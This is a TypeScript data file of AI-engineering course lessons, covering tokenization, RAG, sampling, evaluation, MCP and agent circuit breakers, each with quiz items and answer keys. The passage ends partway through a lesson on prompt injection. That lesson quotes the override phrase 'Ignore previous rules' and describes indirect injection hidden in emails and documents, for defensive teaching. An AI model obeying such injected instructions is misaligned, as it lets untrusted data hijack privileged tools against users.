export interface LessonDeepWalkthrough {
  lessonId: string;
  stepByStepGuide: Array<{
    stepNumber: number;
    title: string;
    detail: string;
    exampleOrFormula: string;
  }>;
  comparisonTable: {
    title: string;
    headers: [string, string, string];
    rows: Array<[string, string, string]>;
  };
  debuggingPlaybook: {
    symptom: string;
    rootCause: string;
    exactFix: string;
  };
  microCheck: {
    question: string;
    options: string[];
    correctIndex: number;
    explanation: string;
  };
}

export const LESSON_DEEP_CONTENT: Record<string, LessonDeepWalkthrough> = {
  't1-l1': {
    lessonId: 't1-l1',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'How Sub-Word Tokenization (BPE) Splits Your Text',
        detail: 'LLMs never see raw strings. A Byte-Pair Encoding (BPE) tokenizer scans your input and groups frequent byte sequences into integer IDs from a vocabulary of ~100,000–200,000 tokens. Common English words stay whole, while rare technical words, UUIDs, or whitespace blocks split into multiple tokens.',
        exampleOrFormula: '"authentication" -> ["auth", "entic", "ation"] (3 tokens) | "UUID: 8f9a-4c2b" -> 9 tokens!'
      },
      {
        stepNumber: 2,
        title: 'Computing the Shared Context Window Budget',
        detail: 'The Context Window (e.g., 200,000 tokens on Claude Sonnet, 1M on Gemini Pro) holds BOTH your input (System Prompt + Tools + RAG Docs + Chat History) AND the model’s generated output.',
        exampleOrFormula: 'Available Output Budget = Max_Context_Window - Total_Input_Tokens'
      },
      {
        stepNumber: 3,
        title: 'Why "Lost in the Middle" Happens in Long Prompts',
        detail: 'Stanford research ("Lost in the Middle", Liu et al.) proved that LLMs pay the strongest attention to tokens at the very beginning (primacy bias) and very end (recency bias) of the prompt. Facts buried in the middle 40–60% suffer up to a 30% drop in retrieval accuracy.',
        exampleOrFormula: 'Optimal Prompt Layout: [System Role & Core Rules] -> [Retrieved RAG Documents] -> [User Query + Output Schema Reminder at Very Bottom]'
      }
    ],
    comparisonTable: {
      title: 'Input Type vs. Token Density & Production Impact',
      headers: ['Content Type', 'Avg Tokens per 100 Chars', 'QA Engineering Action'],
      rows: [
        ['Standard English Prose', '~25 tokens', 'Baseline cost and fast prefill'],
        ['JSON / Source Code', '~35–45 tokens', 'Minify unnecessary indentation in huge payloads'],
        ['UUIDs / Base64 / Hashes', '~65–85 tokens', 'Alias UUIDs to short IDs (DOC_1, DOC_2) before prompting']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Production API intermittently throws `SyntaxError: Unexpected end of JSON input` on large reports.',
      rootCause: 'The LLM hit `max_tokens` mid-generation and stopped before closing the final `}` bracket.',
      exactFix: 'Always assert `response.stop_reason === "end_turn"` before calling `JSON.parse()`, and keep output schemas concise.'
    },
    microCheck: {
      question: 'Quick Check: Where should you place the user’s question and output format reminder when passing 40,000 tokens of RAG documents to Claude or Gemini?',
      options: [
        'At the very bottom of the prompt, right after the closing `</documents>` tag (leveraging recency bias).',
        'Hidden in the exact middle (around token 20,000) between two documents.',
        'Nowhere—let the model guess what the user wants from the documents.'
      ],
      correctIndex: 0,
      explanation: 'Placing the query and output schema instructions at the very end after `<documents>` leverages recency bias and boosts complex retrieval accuracy by up to 30%!'
    }
  },
  't1-l2': {
    lessonId: 't1-l2',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Projecting Text into High-Dimensional Coordinate Space',
        detail: 'An Embedding Model (`text-embedding-004`, `voyage-3`, `text-embedding-3-large`) reads a text passage and outputs a fixed-length array of floating-point numbers (e.g., 1,536 dimensions). Each dimension captures a latent semantic feature.',
        exampleOrFormula: 'embed("How do I reset my password?") -> [0.024, -0.081, 0.412, ..., 0.009] (1,536 floats)'
      },
      {
        stepNumber: 2,
        title: 'Measuring Meaning with Cosine Similarity',
        detail: 'To check if a user question matches a document chunk, we measure the cosine of the angle between their two vectors. When vectors are normalized to length 1.0, Cosine Similarity is simply the fast Dot Product.',
        exampleOrFormula: 'CosineSimilarity(A, B) = (A · B) / (||A|| * ||B||) -> Range: -1.0 (opposite) to +1.0 (identical meaning)'
      },
      {
        stepNumber: 3,
        title: 'Knowing Where Pure Vector Embeddings Fail',
        detail: 'Because embeddings compress overall meaning, they blur exact alphanumeric strings (`SKU-9981` vs `SKU-9982`) and struggle with single-word negation (`"is covered"` vs `"is NOT covered"` often have 0.96 cosine similarity!).',
        exampleOrFormula: 'Fix: Pair Dense Vectors with BM25 Keyword Search + a Cross-Encoder Reranker!'
      }
    ],
    comparisonTable: {
      title: 'Exact String Match vs. Dense Vector Embedding vs. Hybrid Search',
      headers: ['Query Scenario', 'Pure Vector Search', 'Hybrid (Vector + BM25)'],
      rows: [
        ['"My laptop screen is flickering" -> matches "Display hardware troubleshooting"', 'Excellent (0.89 similarity)', 'Excellent'],
        ['"Find error code ERR_SSL_4092_B"', 'Fails (confuses with ERR_SSL_4091_A)', 'Exact Match via BM25'],
        ['"Policy HR-BEN-402B for interns"', 'Partial semantic match', 'Pinpoints exact code + role']
      ]
    },
    debuggingPlaybook: {
      symptom: 'After switching your embedding model from `v1` to `v2`, semantic search returns total garbage.',
      rootCause: 'You embedded new user queries with `v2` but compared them against existing database vectors created by `v1`.',
      exactFix: 'Never mix vector spaces! Upgrading an embedding model requires re-embedding and re-indexing all stored chunks in a blue/green index.'
    },
    microCheck: {
      question: 'Quick Check: Why do the sentences "Take 10mg of Medication X daily" and "Do NOT take 10mg of Medication X daily" have a very high vector cosine similarity (~0.96)?',
      options: [
        'Because both sentences share 90% of the same medical domain vocabulary and topic coordinates—which is why you need a Cross-Encoder Reranker or LLM Judge to catch negation!',
        'Because the tokenizer deletes the word "NOT".',
        'Because Cosine Similarity only counts the number of letters in a sentence.'
      ],
      correctIndex: 0,
      explanation: 'Bi-encoder embeddings measure broad topical/semantic proximity. Catching fine-grained negation requires Cross-Encoder joint attention or an LLM-as-a-Judge Faithfulness check!'
    }
  },
  't1-l3': {
    lessonId: 't1-l3',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'From Raw Logits to Next-Token Probabilities',
        detail: 'At each generation step, the Transformer outputs a raw score ("logit") for every token in its vocabulary. The Softmax function turns those logits into percentages summing to 100%.',
        exampleOrFormula: 'P(token_i) = exp(logit_i / Temperature) / Σ exp(logit_j / Temperature)'
      },
      {
        stepNumber: 2,
        title: 'How Temperature Reshapes the Probability Curve',
        detail: 'As Temperature approaches `0.0`, the highest-scoring token gets ~100% of the probability mass (greedy decoding). At `Temperature = 0.8`, the curve flattens so lower-ranked creative words get a chance to be picked.',
        exampleOrFormula: 'Temp = 0.0 -> Always picks #1 token | Temp = 0.8 -> Samples creatively across top candidates'
      },
      {
        stepNumber: 3,
        title: 'How Top-P (Nucleus Sampling) Cuts Off the Long Tail',
        detail: 'Setting `top_p = 0.9` sorts tokens from most likely to least likely and keeps only the top tokens whose probabilities add up to 90%, throwing away the bottom 10% of weird/hallucinated words.',
        exampleOrFormula: 'Golden Rule: Tune Temperature OR Top-P, never both at the same time!'
      }
    ],
    comparisonTable: {
      title: 'Production Parameter Presets by Engineering Task',
      headers: ['AI Engineering Use Case', 'Recommended Config', 'Why'],
      rows: [
        ['JSON Extraction / Bug Triage / SQL', 'temperature = 0.0 (top_p = 1.0)', 'Maximizes determinism & schema compliance'],
        ['LLM-as-a-Judge Evaluation Grading', 'temperature = 0.0 (top_p = 1.0)', 'Prevents flaky CI/CD evaluation scores'],
        ['Brainstorming Synthetic User Personas', 'temperature = 0.8 (top_p = 1.0)', 'Generates diverse, non-repetitive test inputs']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Your LLM-as-a-Judge CI/CD test passes on run #1, fails on run #2, and passes on run #3 for the exact same input.',
      rootCause: 'The Judge model was left at default `temperature = 1.0`, causing random sampling variance on borderline scores.',
      exactFix: 'Set `temperature: 0` on all Judge models and require generating the written critique BEFORE the integer score.'
    },
    microCheck: {
      question: 'Quick Check: You are building a strict JSON bug severity classifier. What sampling settings should you use?',
      options: [
        '`temperature = 0.0` (leaving `top_p` at default `1.0`) + Constrained Decoding / Tool-Forced JSON Schema.',
        '`temperature = 0.9` and `top_p = 0.2`.',
        '`temperature = 1.0` so the model explores all possible severity labels.'
      ],
      correctIndex: 0,
      explanation: 'Always use `temperature = 0.0` (with `top_p` left untouched at default) for classification and structured JSON extraction!'
    }
  },
  't1-l4': {
    lessonId: 't1-l4',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Layer 1: Fast Deterministic Code Guardrails (<5ms)',
        detail: 'Before spending a penny on LLM Judge calls, run fast deterministic assertions in code on every response: check `stop_reason === "end_turn"`, validate JSON Schema with Zod/Pydantic, verify cited document IDs exist, and scan for leaked regex PII.',
        exampleOrFormula: 'assert(res.stopReason === "end_turn" && ZodSchema.safeParse(json).success)'
      },
      {
        stepNumber: 2,
        title: 'Layer 2: Reference-Free & Reference-Based LLM-as-a-Judge Rubrics',
        detail: 'Use Ragas or DeepEval to grade semantic quality: Faithfulness (zero hallucination vs. retrieved docs), Answer Relevance, and Context Precision.',
        exampleOrFormula: 'Faithfulness = (Claims Supported by Retrieved Context) / (Total Claims in Answer)'
      },
      {
        stepNumber: 3,
        title: 'Layer 3: Golden Dataset & Production Error Flywheel',
        detail: 'Curate a version-controlled dataset of 100+ scenarios (50% happy paths, 25% abstention/missing-data cases, 25% adversarial red-team cases). Every time a real user gives a thumbs-down in production, add that trace to your Golden Dataset!',
        exampleOrFormula: 'Prod Thumbs-Down Trace -> Anonymize -> Annotate Expected Output -> Commit to CI/CD Golden Suite'
      }
    ],
    comparisonTable: {
      title: 'Traditional QA Assertion vs. AI Engineering Evaluation Equivalent',
      headers: ['Traditional QA Concept', 'AI Engineering Equivalent', 'Tool / Framework'],
      rows: [
        ['`assert.equal(res.status, 200)`', '`stop_reason === "end_turn"` & Zod JSON Schema check', 'TypeScript / Zod / Pydantic'],
        ['Database Integration Test', 'RAG Retrieval Recall@K & Context Precision', 'Ragas / DeepEval'],
        ['UI Content Regression Test', 'Faithfulness (Hallucination Check) >= 0.92', 'LLM-as-a-Judge (G-Eval)']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Developers are afraid to upgrade the prompt or switch to a faster model because they don’t know if existing use cases will break.',
      rootCause: 'The team is relying on manual "vibe checks" instead of an automated Golden Evaluation Suite.',
      exactFix: 'Build a 100-row Golden Dataset in DeepEval/Ragas wired into GitHub Actions so every PR prints a quantitative regression report.'
    },
    microCheck: {
      question: 'Quick Check: Which bucket of test cases in a Golden Dataset catches the majority of real-world policy hallucinations?',
      options: [
        'Unanswerable / Out-of-Scope Abstention test cases (verifying the model says "Insufficient information" instead of guessing).',
        'Repeating the exact same "Hello world" prompt 50 times.',
        'Only testing 1-word queries.'
      ],
      correctIndex: 0,
      explanation: 'Testing unanswerable queries where the retrieved context intentionally lacks the answer is the #1 way to verify your model abstains rather than hallucinating!'
    }
  },
  't2-l1': {
    lessonId: 't2-l1',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Model Routing Across Haiku, Sonnet & Opus',
        detail: 'Never use a single massive model for every call. Route fast classification, moderation, and query rewriting to Claude Haiku (<300ms); route core coding, RAG synthesis, and tool calling to Claude Sonnet; reserve Opus or Extended Thinking for complex offline evaluations.',
        exampleOrFormula: 'Traffic Split: 70% Haiku (Fast/Cheap) + 25% Sonnet (Core Agent) + 5% Opus/Thinking (Deep Judge)'
      },
      {
        stepNumber: 2,
        title: 'Prefix KV Prompt Caching (`cache_control: { type: "ephemeral" }`)',
        detail: 'When your system prompt, tool definitions, or handbook exceeds 1,024 tokens, place all static content at the very top and mark the breakpoint with `cache_control`. Subsequent calls within 5–60 minutes reuse the GPU KV cache at up to 90% discount.',
        exampleOrFormula: 'Static Prefix Order: [1. Tool Schemas] -> [2. System Prompt] -> [3. Few-Shot Examples] --(CACHE BREAKPOINT)-- -> [4. Dynamic User Turn]'
      }
    ],
    comparisonTable: {
      title: 'Claude Model Tier Selection Matrix',
      headers: ['Claude Tier', 'Latency / Cost Profile', 'Ideal Production Role'],
      rows: [
        ['Claude Haiku', 'Sub-300ms | Ultra-Low Cost', 'Input guardrails, intent routing, query rewriting'],
        ['Claude Sonnet', 'Balanced Speed | Workhorse', 'Production coding, RAG generation, MCP tool agents'],
        ['Claude Opus / Extended Thinking', 'Multi-second | Deep Compute', 'Complex architecture synthesis & offline LLM-as-a-Judge']
      ]
    },
    debuggingPlaybook: {
      symptom: 'You enabled `cache_control: { type: "ephemeral" }` on a 15,000-token system prompt, but `cache_read_input_tokens` is always 0!',
      rootCause: 'You injected a dynamic timestamp (`Current time: 17:04:12`) or random request ID at the very top of the system prompt, invalidating the prefix match on every call.',
      exactFix: 'Keep the system prompt 100% static bit-for-bit, and move dynamic timestamps or user metadata into the final user turn.'
    },
    microCheck: {
      question: 'Quick Check: Why did placing `Current Time: ${new Date().toISOString()}` on Line 1 of a 20,000-token system prompt result in a 0% Prompt Cache hit rate?',
      options: [
        'Because Transformer KV Caching is strictly prefix-based from left to right—changing token #1 invalidates the cached attention states of all 19,999 tokens after it!',
        'Because Prompt Caching only works on weekends.',
        'Because JSON strings cannot be cached.'
      ],
      correctIndex: 0,
      explanation: 'KV caching requires an exact byte-for-byte prefix match from the beginning of the prompt. Always put dynamic variables at the very end!'
    }
  },
  't2-l2': {
    lessonId: 't2-l2',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Enforcing Structural Boundaries with Semantic XML Tags',
        detail: 'Wrap distinct sections of your prompt in descriptive XML tags: `<role>`, `<rules>`, `<documents>`, `<untrusted_user_input>`, `<examples>`, and `<output_schema>`. Claude is fine-tuned to respect these boundaries.',
        exampleOrFormula: '<documents><document index="1"><source>HR-402</source><document_content>...</document_content></document></documents>'
      },
      {
        stepNumber: 2,
        title: 'Quote-First Grounding + Explicit Abstention Permission',
        detail: 'To eliminate hallucinations, instruct Claude to first extract verbatim quotes from `<documents>` inside `<quotes>` tags before writing `<answer>`, and explicitly state that if the documents lack the answer, it must output `"INSUFFICIENT_DATA"` and set missing fields to `null`.',
        exampleOrFormula: 'Step 1: Extract <quotes> -> Step 2: Check if quote answers query -> Step 3: Output grounded JSON or abstain'
      }
    ],
    comparisonTable: {
      title: 'Naive Text Prompting vs. Anthropic XML Architecture',
      headers: ['Dimension', 'Naive Conversational Prompt', 'Engineered XML + Tool-Forced Prompt'],
      rows: [
        ['Missing Data Handling', 'Guesses plausible-sounding fake values', 'Sets unstated fields to `null` deterministically'],
        ['JSON Parsing Reliability', 'Fails 2–5% due to ```json fences or prose', '99.9%+ via `tool_choice` schema enforcement'],
        ['Prompt Injection Resilience', 'Vulnerable to instruction overrides', 'Isolates `<untrusted_input>` as passive data']
      ]
    },
    debuggingPlaybook: {
      symptom: 'When a user bug report omits the browser version, the LLM invents `"browser": "Chrome 124.0"` in the JSON ticket.',
      rootCause: 'Your schema marked `browser` as a required non-nullable string with no abstention instruction.',
      exactFix: 'Allow `"string | null"` in your schema, add an explicit rule ("Set unstated fields to null—never guess"), and include a few-shot example showing `"browser": null`.'
    },
    microCheck: {
      question: 'Quick Check: How do you guarantee Claude returns raw schema-valid JSON without wrapping it in conversational text like "Sure! Here is your JSON:"?',
      options: [
        'Define a tool with your strict JSON `input_schema` and force its execution via `tool_choice: { type: "tool", name: "your_schema_tool" }`.',
        'Write "PLEASE DO NOT TALK" in capital letters.',
        'Set `temperature: 1.0`.'
      ],
      correctIndex: 0,
      explanation: 'Tool-forcing (`tool_choice`) or native Constrained Decoding enforces the JSON schema contract at generation time!'
    }
  },
  't2-l3': {
    lessonId: 't2-l3',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Why MCP Exists: Solving the N×M Integration Matrix',
        detail: 'Instead of writing custom glue code connecting every AI Host (Claude Desktop, Cursor, custom web agents) to every tool (GitHub, Jira, Postgres, Playwright), MCP provides one universal JSON-RPC 2.0 protocol.',
        exampleOrFormula: 'MCP Host (AI App) <--> MCP Client <== JSON-RPC 2.0 ==> MCP Server (GitHub / Playwright / DB)'
      },
      {
        stepNumber: 2,
        title: 'Mastering the 3 MCP Primitives: Resources, Tools & Prompts',
        detail: 'An MCP Server exposes: (1) Resources (read-only URI-addressed data like log files or DB schemas), (2) Tools (executable functions with JSON Schema validation), and (3) Prompts (reusable templates).',
        exampleOrFormula: 'Resource = GET (Read-Only Data) | Tool = POST (Executable Action) | Prompt = Template'
      }
    ],
    comparisonTable: {
      title: 'The 3 Core MCP Server Primitives',
      headers: ['MCP Primitive', 'Controlled By', 'Concrete QA / Engineering Example'],
      rows: [
        ['Resources', 'Application / User-driven context', 'Reading `ci://build-logs/latest` or `postgres://schema`'],
        ['Tools', 'Model-invoked (with HITL approval)', 'Calling `run_playwright_suite({ tag: "@smoke" })`'],
        ['Prompts', 'User-selected slash templates', 'Selecting `/triage-flaky-test` template in IDE']
      ]
    },
    debuggingPlaybook: {
      symptom: 'An MCP-connected agent accidentally deletes staging records when asked to inspect database health.',
      rootCause: 'The MCP Server exposed a single unrestricted `execute_raw_sql` tool using a read-write database connection string.',
      exactFix: 'Connect read-only database credentials for inspection, expose scoped read-only `Resources`, and require Human-in-the-Loop approval on any mutating `Tool`.'
    },
    microCheck: {
      question: 'Quick Check: In an MCP Server for your QA team, which primitive should you use to expose read-only CI/CD test logs vs. triggering a staging test run?',
      options: [
        'Expose read-only CI/CD logs as an MCP `Resource`, and expose triggering a test run as an MCP `Tool`.',
        'Expose both as unvalidated raw strings.',
        'Put database passwords directly inside the system prompt.'
      ],
      correctIndex: 0,
      explanation: 'Resources are for read-only context data; Tools are for model-invoked actions with JSON Schema validation!'
    }
  },
  't3-l1': {
    lessonId: 't3-l1',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'How Native Multimodal Tokenization Works in Gemini',
        detail: 'Traditional pipelines run separate OCR on PDFs or Whisper ASR on audio before sending lossy text to an LLM. Gemini tokenizes images, video frames (~258 tokens/sec), audio waveforms (~32 tokens/sec), and PDF visual page renders directly into the same unified transformer attention space.',
        exampleOrFormula: 'Input: [ScreenRecording.mp4 + ServerError.log] -> Unified Multimodal Attention -> Pinpoints exact MM:SS bug timestamp'
      },
      {
        stepNumber: 2,
        title: 'Constrained Decoding with `responseSchema` + `responseMimeType`',
        detail: 'When you pass `responseMimeType: "application/json"` and a typed `responseSchema`, Gemini builds a finite-state grammar mask during decoding. Any token that would violate your JSON property names, types, or required fields is masked to probability 0.',
        exampleOrFormula: 'config: { temperature: 0, responseMimeType: "application/json", responseSchema: { ... } }'
      }
    ],
    comparisonTable: {
      title: 'Legacy OCR + Text RAG vs. Gemini Native Multimodal Ingestion',
      headers: ['Document Feature', 'Legacy Text OCR Pipeline', 'Gemini Native PDF / Vision'],
      rows: [
        ['Multi-column pricing tables', 'Scrambles rows & loses column alignment', 'Reads visual table grid with 99% fidelity'],
        ['Embedded architecture diagrams', 'Completely ignored (0 tokens extracted)', 'Traces arrows, boxes, and flow logic natively'],
        ['UI Bug Screen Recordings (.mp4)', 'Cannot process video', 'Correlates visual UI state with console logs']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Asking 20 sequential questions against a 600-page engineering PDF takes 18 seconds per turn and costs $0.80 per question.',
      rootCause: 'You are re-uploading and re-prefilling the entire 600-page PDF on every single API turn.',
      exactFix: 'Upload the PDF once and create a Vertex AI / Gemini `CachedContent` resource with a 60-minute TTL—cutting latency to <1.2s and cost by 75–90%.'
    },
    microCheck: {
      question: 'Quick Check: Why does Gemini’s `responseSchema` guarantee 100% syntactically valid JSON compared to just asking "Output JSON" in the prompt?',
      options: [
        'It uses Constrained Decoding (finite-state grammar masking at the token sampling layer) so invalid JSON tokens cannot be sampled.',
        'It hires a human to edit the JSON.',
        'It retries the request 50 times.'
      ],
      correctIndex: 0,
      explanation: 'Constrained Decoding masks out any vocabulary token that violates the target JSON grammar at every generation step!'
    }
  },
  't3-l2': {
    lessonId: 't3-l2',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Knowing When to Graduate from Google AI Studio to Vertex AI',
        detail: 'Use Google AI Studio for fast API-key prototyping. Move to Google Cloud Vertex AI for production: IAM role-based access control, VPC Service Controls (VPC-SC), Customer-Managed Encryption Keys (CMEK), HIPAA/SOC2 compliance, and zero-training data guarantees.',
        exampleOrFormula: 'Prototype: AI Studio (API Key) ===> Enterprise Production: Vertex AI (GCP IAM + VPC-SC + CMEK)'
      },
      {
        stepNumber: 2,
        title: 'Verifying Citations with `groundingMetadata`',
        detail: 'When Grounding with Google Search or Vertex AI Search is enabled, inspect `candidates[0].groundingMetadata.groundingSupports` to verify that every factual claim in the response maps to a retrieved source URL and character span.',
        exampleOrFormula: 'assert(candidate.groundingMetadata.groundingChunks.length > 0)'
      }
    ],
    comparisonTable: {
      title: 'Google AI Studio vs. Google Cloud Vertex AI',
      headers: ['Requirement', 'Google AI Studio', 'Google Cloud Vertex AI'],
      rows: [
        ['Authentication', 'Simple Developer API Key', 'Google Cloud IAM Roles & Service Accounts'],
        ['Network & Data Security', 'Public HTTPS Endpoint', 'VPC Service Controls, Private Service Connect, CMEK'],
        ['Evaluation & Monitoring', 'Manual Playground', 'Managed Vertex AI GenAI Evaluation Service & BigQuery']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Your production app crashes with `TypeError: Cannot read properties of undefined (reading "text")` on 1% of user prompts.',
      rootCause: 'Vertex AI Safety Filters blocked the response (`finishReason === "SAFETY"`), returning an empty content candidate.',
      exactFix: 'Always check `candidate.finishReason === "SAFETY"` (and inspect `safetyRatings`) before reading response text!'
    },
    microCheck: {
      question: 'Quick Check: Which response field in Gemini/Vertex AI maps specific sentences in the generated answer back to the exact source URLs that grounded them?',
      options: [
        '`candidates[0].groundingMetadata` (`groundingChunks` and `groundingSupports`).',
        '`usageMetadata.totalTokenCount`.',
        '`safetyRatings[0].probability`.'
      ],
      correctIndex: 0,
      explanation: '`groundingMetadata` provides both the source chunks (`groundingChunks`) and the exact character span mappings (`groundingSupports`)!'
    }
  },
  't4-l1': {
    lessonId: 't4-l1',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Stage 1: Contextual Chunking (Eliminating Orphan Chunks)',
        detail: 'Split documents along semantic section boundaries (300–500 tokens with 10–15% overlap) and prepend the document title + section header (`[Doc: Handbook | Section 4.2: Parental Leave]`) to every single chunk before embedding.',
        exampleOrFormula: 'Contextual Chunk = "[Doc | Section | Policy Code]\\n" + Raw_Chunk_Text'
      },
      {
        stepNumber: 2,
        title: 'Stage 2: Parallel Hybrid Search (Dense Vectors + BM25) & RRF Merge',
        detail: 'Run Dense Vector search (meaning) and Sparse BM25 search (exact SKUs/error codes) in parallel, then merge their top-50 rankings using Reciprocal Rank Fusion (`RRF`).',
        exampleOrFormula: 'RRF_Score(doc) = 1 / (60 + rank_vector) + 1 / (60 + rank_bm25)'
      },
      {
        stepNumber: 3,
        title: 'Stage 3: Cross-Encoder Reranking (Top-50 -> Top-5)',
        detail: 'Pass the Top-50 RRF candidates + user query through a Cross-Encoder Reranker (Cohere Rerank 3.5 / BGE-Reranker) to jointly score token-level relevance, sending only the Top-5 gold chunks to the LLM.',
        exampleOrFormula: '50 Hybrid Candidates --(Cross-Encoder Reranker)--> Top 5 High-Precision Chunks to LLM'
      }
    ],
    comparisonTable: {
      title: 'Bi-Encoder Vector Search vs. Cross-Encoder Reranker',
      headers: ['Dimension', 'Bi-Encoder (Vector DB)', 'Cross-Encoder (Reranker)'],
      rows: [
        ['How It Computes Score', 'Compares pre-computed separate vectors via Cosine Similarity', 'Passes Query + Document together through full Transformer cross-attention'],
        ['Speed at 1,000,000 Docs', '~15ms (Fast HNSW Index)', 'Too slow for 1M docs—run only on Top-50 candidates (~80ms)'],
        ['Accuracy on Nuance/Negation', 'Moderate (loses fine token interaction)', 'Ultra-High (+20–35% Context Precision boost)']
      ]
    },
    debuggingPlaybook: {
      symptom: 'In a multi-turn chat, the user asks "What is parental leave for engineers?" and then follows up with "What about contractors?", retrieving irrelevant construction documents.',
      rootCause: 'You embedded the follow-up string `"What about contractors?"` without rewriting it using conversation history.',
      exactFix: 'Add a fast Conversational Query Rewriter (Haiku/Flash) that turns `"What about contractors?"` into the standalone query `"What is the parental leave policy for contractors?"` before searching.'
    },
    microCheck: {
      question: 'Quick Check: Where must user RBAC / ACL document permissions be enforced in an enterprise RAG pipeline?',
      options: [
        'As a deterministic metadata pre-filter inside the Vector + BM25 database query (`allowed_groups $in userJwt.groups`) BEFORE chunks are retrieved.',
        'By retrieving all secret CEO documents into the prompt and asking the LLM nicely not to share them.',
        'In the frontend CSS.'
      ],
      correctIndex: 0,
      explanation: 'Never allow unauthorized chunks to enter the LLM context window! Enforce ACL metadata filtering inside the vector database query.'
    }
  },
  't4-l2': {
    lessonId: 't4-l2',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'The ReAct Execution Cycle: Thought -> Action -> Observation',
        detail: 'An agent reasons about the goal (`Thought`), emits a structured JSON tool call (`Action`), receives the backend tool execution result (`Observation`), and repeats until the goal is achieved.',
        exampleOrFormula: 'Loop: Thought -> Action (Tool JSON) -> Observation (Tool Result) [Bounded by max_iterations <= 5]'
      },
      {
        stepNumber: 2,
        title: 'Engineering the 5 Mandatory Agent Circuit Breakers',
        detail: 'Protect production agents with: (1) `max_iterations` hard cap, (2) cumulative token/dollar budget, (3) duplicate `(tool_name, args)` call hash blocker, (4) structured timeout fallback instructions, and (5) Human-in-the-Loop (HITL) approval gates for write/delete tools.',
        exampleOrFormula: 'if (seenToolCalls.has(hash(tool, args))) return triggerCircuitBreaker();'
      }
    ],
    comparisonTable: {
      title: 'Deterministic Workflows vs. Autonomous ReAct Agents',
      headers: ['Criteria', 'Deterministic Workflow (Chaining/Routing)', 'Autonomous ReAct Agent Loop'],
      rows: [
        ['Control Flow', 'Defined deterministically in TypeScript/Python code', 'Decided dynamically per turn by the LLM'],
        ['Latency & Cost Predictability', 'High predictability, easy to unit-test', 'Variable latency/cost—requires strict circuit breakers'],
        ['When to Choose', 'Known multi-step pipelines (90% of enterprise apps)', 'Open-ended debugging or unpredictable multi-hop tasks']
      ]
    },
    debuggingPlaybook: {
      symptom: 'When a downstream API returns HTTP 503, the agent calls the failing tool 35 times in a row until the request times out.',
      rootCause: 'No `max_iterations` cap, no duplicate-call detector, and an unhelpful raw stack trace returned as the tool observation.',
      exactFix: 'Cap `max_iterations = 5`, block duplicate tool calls, and return `{"status": "ERROR_503", "retryAllowed": false, "fallback": "Use cached summary"}`.'
    },
    microCheck: {
      question: 'Quick Check: How many distinct tools should you attach to a single agent before tool-selection accuracy starts degrading?',
      options: [
        'Keep each agent focused to <= 10–15 well-documented tools; if you have 50+ tools, use a Router or specialized Sub-Agents.',
        'Attach 500 tools into one giant prompt.',
        'Remove all parameter descriptions.'
      ],
      correctIndex: 0,
      explanation: 'Overwhelming a single agent with 50+ tool schemas causes parameter hallucination and wrong tool selection!'
    }
  },
  't4-l3': {
    lessonId: 't4-l3',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Isolating Defects with the RAG Triad (Ragas & DeepEval)',
        detail: 'Measure three orthogonal metrics: (1) Context Recall & Precision (did the Retriever find the right chunks?), (2) Faithfulness (did the Generator stick strictly to those chunks without hallucinating?), and (3) Answer Relevance (did it answer the user’s question?).',
        exampleOrFormula: 'Faithfulness = (Number of Atomic Claims Supported by Retrieved Context) / (Total Claims in Answer)'
      },
      {
        stepNumber: 2,
        title: 'Eliminating LLM-as-a-Judge Biases & Calibrating with Humans',
        detail: 'Avoid vague 1–100 scales! Use 1–5 anchored rubrics or binary claim checks at `temperature = 0`, force the Judge to write `"critique"` BEFORE `"score"`, swap A/B positions to eliminate Position Bias, and calibrate against 50 human-graded examples.',
        exampleOrFormula: 'Judge JSON Order: { "atomic_claims": [...], "critique": "...", "score_1_to_5": 5 }'
      }
    ],
    comparisonTable: {
      title: 'RAG Triad Root-Cause Diagnostic Matrix',
      headers: ['Metric Symptom', 'Where the Bug Lives', 'Exact Engineering Fix'],
      rows: [
        ['Low Context Recall (0.40) + High Faithfulness (0.98)', 'Broken Retriever (LLM honestly says "I don’t know")', 'Add Hybrid BM25 + Vector search & Contextual Chunking'],
        ['High Context Recall (0.95) + Low Faithfulness (0.55)', 'Hallucinating Generator LLM', 'Tighten XML grounding prompt, require `<quotes>`, set Temp=0'],
        ['High Recall (0.95) + Low Context Precision (0.45)', 'Noisy Unranked Chunks diluting context', 'Add a Stage-2 Cross-Encoder Reranker (Top-50 -> Top-5)']
      ]
    },
    debuggingPlaybook: {
      symptom: 'Your LLM Judge gives a score of 5/5 to a long, polite 4-paragraph answer that subtly invents a fake refund policy.',
      rootCause: 'Verbosity Bias + holistic scoring without atomic claim decomposition.',
      exactFix: 'Use Ragas/DeepEval claim decomposition (extracting each atomic claim first and verifying it true/false against `<context>`) and add an explicit Anti-Verbosity rule.'
    },
    microCheck: {
      question: 'Quick Check: Why must `"critique"` appear BEFORE `"score"` in an LLM-as-a-Judge JSON schema?',
      options: [
        'Because LLMs generate tokens left-to-right autoregressively—writing the evidence critique first conditions the numeric score on actual reasoning!',
        'Because alphabetical order is required by JSON.',
        'To make the payload larger.'
      ],
      correctIndex: 0,
      explanation: 'If the score token is emitted first, the model commits to an unreasoned number and rationalizes it afterward!'
    }
  },
  't4-l4': {
    lessonId: 't4-l4',
    stepByStepGuide: [
      {
        stepNumber: 1,
        title: 'Direct vs. Indirect Prompt Injection (OWASP LLM01)',
        detail: 'Direct Injection comes from the chat user typing "Ignore previous rules". Indirect Injection hides malicious instructions inside third-party data (emails, resumes, web pages, RAG docs) that the LLM ingests and mistakenly executes.',
        exampleOrFormula: 'Untrusted Data + Privileged Agent Tools = Confused Deputy Vulnerability'
      },
      {
        stepNumber: 2,
        title: 'Defense-in-Depth: XML Isolation + Server-Side JWT Binding',
